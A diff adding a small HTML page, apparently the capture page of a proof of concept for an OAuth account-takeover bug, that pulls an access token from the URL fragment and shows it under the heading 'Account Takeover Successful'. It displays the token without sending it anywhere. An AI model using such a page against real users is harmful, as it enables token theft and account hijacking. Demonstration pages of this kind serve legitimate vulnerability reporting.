@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h2 style="color: red;">Account Takeover Successful</h2>
+    <h3>Extracted Token:</h3>
+    <p id="token-display" style="word-wrap: break-word; background: #eee; padding: 10px; border: 1px solid #ccc;"></p>
+
+    <script>
+        // Extract the token from the URL fragment (e.g., #access_token=EAAD...)
+        var hash = window.location.hash;
+        if (hash) {
+            document.getElementById("token-display").innerText = hash;
+        } else {
+            document.getElementById("token-display").innerText = "No token found in URL.";
+        }
+    </script>
+</body>
+</html>
